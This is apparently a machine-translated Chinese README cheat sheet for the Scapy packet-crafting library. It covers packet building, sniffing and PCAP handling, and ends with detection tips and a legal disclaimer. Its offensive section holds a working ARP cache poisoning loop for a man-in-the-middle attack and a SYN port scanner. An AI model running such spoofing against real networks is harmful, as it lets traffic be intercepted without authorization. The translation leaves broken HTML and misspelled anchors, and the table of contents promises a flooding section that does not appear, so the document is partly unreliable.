<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🐍 Scapy - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
  ███████║╚██████╗██║  ██║██║        ██║   
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   
       Interactive Packet Crafting, Sniffing & Forging Engine
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Scapy-Packet_Crafting-blue?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/Author-Philippe_Biondi-orange?style=for-the-badge" alt="secdev">
  <img src="https://img.shields.io/badge/Language-Python-green?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Category-Network_Attacks-purple?style=for-the-badge" alt="网络攻击">
</p>

<p对齐=“中心”>
  <b>🐍基于Python的终极交互式数据包操作工具和库，能够伪造、发送、嗅探、剖析和模糊任意网络数据包</b>
</p>

---

## 📋 目录

- [概述和堆叠层模型 (`/`)](#-overview--the-stacking-layer-model-)
- [安装](#-安装)
- [启动交互式 Shell](#-starting-the-interactive-shell)
- [制作网络数据包](#-crafting-network-packets)
  - [IP 和 TCP 握手](#ip-and-tcp-handshakes)
  - [ICMP Ping 和跟踪路由](#icmp-ping--traceroute)
  - [DNS 查询和解析](#dns-queries--resolution)
- [发送和接收数据包](#-sending--receiving-packets)
  - [第 3 层：`send()`、`sr()`、`sr1()`](#layer-3-send-sr-sr1)
  - [第 2 层：`sendp()`、`srp()`、`srp1()`](#layer-2-sendp-srp-srp1)
- [数据包嗅探和 PCAP 处理](#-packet-sniffing--pcap-handling)
  - [捕获实时数据包 (`sniff()`)](#capturing-live-packets-sniff)
  - [读写 PCAP 文件](#reading--writing-pcap-files)
- [进攻性网络攻击](#-offective-network-attacks)
  - [ARP 缓存中毒 (MITM)](#arp-cache-poisoning-mitm)
  - [SYN端口扫描脚本](#syn-port-scanning-script)
  - [TCP SYN / ICMP 泛洪](#tcp-syn--icmp-flooding)
- [快速参考表](#-quick-reference-table)
- [防守考虑与检测](#-defective-considerations--detection)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和堆叠层模型 (`/`)

由 **Philippe Biondi** 创建，**Scapy** 取代了数十种单一用途的网络工具（ping、traceroute、arpspoof、nmap 存根）。

Scapy 的天才之处在于使用 Python 的除法运算符 (`/`) 将协议层堆叠在一起：
```python
packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / "Raw Payload"
```
每个层字段都有 Scapy 自动计算的合理默认值（校验和、长度、MAC 地址、源 IP）。

---

## 📥 安装
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y python3-scapy

# Python pip (Latest version)
pip install scapy

# Arch Linux
sudo pacman -S python-scapy
```
---

## 🚀 启动交互式 Shell

启动交互式 REPL shell（需要 root 权限才能伪造原始套接字）：
```bash
sudo scapy
```
检查 Scapy 内可用的协议和函数：
```python
>>> ls()          # List all supported network protocols (850+)
>>> ls(IP)        # List fields and defaults of the IP layer
>>> lsc()         # List available Scapy command functions
```
---

## 🛠️ 制作网络数据包

### IP 和 TCP 握手
```python
# Create a TCP SYN packet to web port 80
syn_pkt = IP(dst="192.168.1.50") / TCP(dport=80, flags="S")
syn_pkt.show()
```
### ICMP Ping 和跟踪路由
```python
# Send ICMP Echo Request and await single response (sr1)
reply = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
if reply:
    reply.show()

# Automated graphical TCP traceroute
ans, unans = traceroute(["8.8.8.8", "1.1.1.1"], dport=443, maxttl=20)
```
### DNS 查询和解析
```python
# Craft raw DNS A-record query to 8.8.8.8
dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, verbose=False)
print(response[DNS].summary())
```
---

## 📡 发送和接收数据包

Scapy通过OSI层分离传输：

### 第 3 层：`send()`、`sr()`、`sr1()`
使用内核分配的以太网标头进行操作（从 IP 层开始）：
- `send(pkt)`：第3层传输数据包；不等待回复。
- `sr(pkt)`：发送数据包并返回已应答和未应答对 `(ans, unans)`。
- `sr1(pkt)`：发送数据包并仅返回第一个响应数据包。

### 第 2 层：`sendp()`、`srp()`、`srp1()`
自定义以太网/数据链路帧（从 `Ether()` 开始）：
- `sendp(Ether() / IP(...), iface="eth0")`：发送原始以太网帧。
- `srp(Ether() / ARP(...))`：发送 ARP 请求并接收回复。

---

## 🔍 数据包嗅探和 PCAP 处理

### 捕获实时数据包（`sniff()`）
```python
# Sniff 10 packets on interface eth0
pkts = sniff(iface="eth0", count=10)

# Sniff with BPF (Berkeley Packet Filter) syntax
http_pkts = sniff(filter="tcp port 80 or port 443", count=20)

# Process packets with custom callback function
def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"[{packet[IP].src}:{packet[TCP].sport}] -> [{packet[IP].dst}:{packet[TCP].dport}]")

sniff(iface="eth0", prn=packet_callback, store=0)
```
### 读取和写入 PCAP 文件
```python
# Save captured packets to standard Wireshark PCAP
wrpcap("capture.pcap", pkts)

# Read PCAP file into Scapy list
read_pkts = rdpcap("capture.pcap")
read_pkts[0].show()
```
---

## ⚔️ Offensive Network Attacks

### ARP Cache Poisoning (MITM)
欺骗 ARP 表来拦截受害者和网关之间的流量：
```python
from scapy.all import *
import time

victim_ip = "192.168.1.105"
gateway_ip = "192.168.1.1"

# Craft deceptive ARP replies
victim_arp = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

print("[*] Poisoning ARP tables...")
try:
    while True:
        send(victim_arp, verbose=False)
        send(gateway_arp, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
```
### SYN端口扫描脚本
```python
def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    resp = sr1(pkt, timeout=1, verbose=False)
    if resp and resp.haslayer(TCP):
        if resp[TCP].flags == 0x12: # SYN-ACK received
            print(f"[+] Port {port} is OPEN")
            # Send RST to be polite
            send(IP(dst=ip)/TCP(dport=port, flags="R"), verbose=False)

scan_port("192.168.1.1", 80)
```
---

## ⚡ 快速参考表

|目标| Scapy 命令 |
|------------|--------------|
| **启动交互式外壳** | `sudo scapy` |
| **检查协议字段** | `ls(IP)` 或 `ls(TCP)` |
| **发送 L3 数据包** | `send(IP(dst="1.1.1.1")/ICMP())` |
| **发送和接收第一个回复**| `resp = sr1(IP(dst="1.1.1.1")/ICMP())` |
| **发送 L2 以太网帧** | `sendp(Ether()/IP(...), iface="eth0")` |
| **使用 BPF 过滤器嗅探** | `sniff(iface="eth0", filter="icmp", count=5)` |
| **保存到 PCAP** | `wrpcap("out.pcap", pkts)` |
| **从 PCAP 读取** | `pkts = rdpcap("in.pcap")` |

---

## 🛡️ 防守考虑和检测

1. **动态 ARP 检测 (DAI)：** 使用 DAI 和 DHCP 侦听配置企业交换机，以丢弃伪造的免费 ARP 回复。
2. **IDS/Suricata 规则：** Scapy 生成的快速半开 SYN 扫描和畸形 TCP 标志组合（Xmas、NULL）会触发标准 IDS 警报。

---

## ⚠️ 法律免责声明

> [!警告]
> Scapy 可以生成格式错误的数据包，从而导致拒绝服务情况或拦截私有数据。必须严格用于授权安全评估和隔离测试网络。